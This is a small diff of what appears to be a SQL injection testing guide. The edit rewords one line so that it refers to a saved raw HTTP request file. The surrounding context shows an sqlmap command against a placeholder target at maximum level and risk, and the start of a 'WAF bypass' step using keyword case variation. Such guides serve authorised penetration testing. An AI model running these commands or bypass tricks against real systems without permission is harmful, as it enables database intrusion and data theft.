@@ -109,7 +109,7 @@ sqlmap -u "https://target.com/api/x" \
   --headers="Content-Type: application/json" \
   --cookie "session=..." --level 5 --risk 3 -p id
 ```
-Use `-r request.txt` mode with raw Burp/Caido request for complex auth.
+Use `-r request.txt` mode with a saved raw HTTP request file for complex auth.
 
 ### Step 5: WAF bypass
 * Case variation: `SeLeCt` instead of `SELECT`
